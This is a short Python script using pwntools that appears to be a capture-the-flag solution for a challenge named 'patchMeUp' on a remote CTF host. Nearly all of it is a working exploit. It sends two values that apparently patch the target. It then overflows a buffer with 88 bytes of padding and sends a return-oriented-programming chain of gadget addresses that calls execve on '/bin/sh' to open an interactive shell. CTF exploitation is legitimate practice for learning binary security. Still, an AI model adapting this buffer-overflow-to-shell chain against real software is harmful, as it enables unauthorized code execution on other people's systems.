from pwn import*
context.binary = 'patchMeUp'


p = remote('pwn-patchmeup.pwnsec.xyz', 37117)

chain = b'A'*88
popRdi = 0x0000000000401f0f
popRsi = 0x0000000000409f7e
popRdxpopRbx = 0x000000000048771b
execVEAdd = 0x0047ab30
binshAdd = 0x0049afa5
chain += p64(popRdi)
chain += p64(binshAdd)
chain += p64(popRsi)
chain += p64(0)
chain += p64(popRdxpopRbx)
chain += p64(0)
chain += p64(0)
chain += p64(execVEAdd)

p.recvuntil(b'!')
p.sendline(b'0x17ff')
p.recvuntil(b'): ')
p.sendline(b'0x75')
p.recvline()

test = 0x401775
chain2 = b'A'*88
chain2 += p64(test)
p.sendlineafter(b"===\n", chain)
p.interactive()
